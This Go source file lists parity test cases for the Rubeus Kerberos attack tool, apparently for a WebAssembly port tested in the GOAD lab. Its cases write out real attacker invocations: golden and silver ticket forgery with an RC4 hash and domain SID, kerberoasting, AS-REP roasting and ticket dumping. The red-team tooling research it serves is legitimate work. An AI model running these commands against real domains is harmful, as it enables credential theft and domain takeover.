// Package rubeus exports the canonical ParityCase slice for Rubeus parity tests.
// Both the test file (rubeus_parity_test.go) and capture-baseline share this list.
//
// Every case is a real attacker invocation backed by canonical Rubeus
// documentation (GhostPack/Rubeus README + harmj0y blog posts).
// Goldens are captured from the NATIVE Rubeus.exe (Flangvik/Sharp-
// Collection precompiled) running against the GOAD lab.
package rubeus

import (
	"time"

	"github.com/praetorian-inc/wftest/parity/internal/lab"
	"github.com/praetorian-inc/wftest/parity/labctl"
)

// GOAD sevenkingdoms.local constants.
const (
	goadDomainSID = "S-1-5-21-1004336348-1177238915-682003330"
)

// Cases returns the per-verb invocation list for Rubeus parity.
func Cases() []labctl.ParityCase {
	const tOffline = 30 * time.Second
	const tDC = 90 * time.Second
	return []labctl.ParityCase{
		// Offline / deterministic — no DC contact required.
		{
			Name: "hash",
			Args: []string{"hash", "/password:password", "/user:domainuser", "/domain:" + lab.Domain()},
			Timeout: tOffline,
		},
		{
			// Forge a golden TGT for the Administrator account.
			// NOTE for wasmforge: /domain MUST precede /rc4 — NativeAOT
			// dict ordering determines wasm32 stack layout; /rc4 as arg[1]
			// triggers a silent crash. Native Rubeus is unaffected.
			Name: "golden",
			Args: []string{
				"golden",
				"/domain:" + lab.Domain(),
				"/sid:" + goadDomainSID,
				"/user:Administrator",
				"/rc4:9c747923cca6ffd9b8c45acc6dc04dc1",
				"/nowrap",
			},
			Timeout: tOffline,
		},
		{
			Name: "silver",
			Args: []string{
				"silver",
				"/domain:" + lab.Domain(),
				"/sid:" + goadDomainSID,
				"/user:Administrator",
				"/service:cifs/" + lab.DC(),
				"/rc4:9c747923cca6ffd9b8c45acc6dc04dc1",
				"/nowrap",
			},
			Timeout: tOffline,
		},
		{Name: "currentluid", Args: []string{"currentluid"}, Timeout: tOffline},

		// DC-contact verbs (run as domainuser; require live AS/TGS).
		// Args are exactly what a real attacker would type. The test
		// framework's PrepareArgs() (see nativeaot_workaround.go) augments
		// the invocation with a NativeAOT-WASI silent-exit sentinel that the
		// C# patcher strips inside Main, so cases.go stays free of
		// framework-level quirks.
		{
			Name:    "asktgt",
			Args:    []string{"asktgt", "/user:domainuser", "/password:password", "/domain:" + lab.Domain(), "/nowrap"},
			Persona: "win11-domainuser",
			Timeout: tDC,
		},
		{
			Name:    "kerberoast",
			Args:    []string{"kerberoast", "/domain:" + lab.Domain(), "/nowrap"},
			Persona: "win11-domainuser",
			Timeout: tDC,
		},
		{
			Name:    "asreproast",
			Args:    []string{"asreproast", "/domain:" + lab.Domain(), "/nowrap"},
			Persona: "win11-domainuser",
			Timeout: tDC,
		},

		// LSA / local ticket cache (run from session that has cached tickets).
		{Name: "klist", Args: []string{"klist"}, Persona: "win11-domainuser", Timeout: tDC},
		{Name: "triage", Args: []string{"triage"}, Persona: "win11-domainuser", Timeout: tDC},
		{Name: "dump", Args: []string{"dump"}, Persona: "win11-domainuser", Timeout: tDC},
		{Name: "logonsession", Args: []string{"logonsession"}, Persona: "win11-domainuser", Timeout: tDC},

		// Process-isolation verb (still runs without DC contact).
		{
			Name: "createnetonly",
			Args: []string{"createnetonly", "/program:C:\\Windows\\System32\\cmd.exe", "/show"},
			Timeout: tOffline,
		},
	}
}
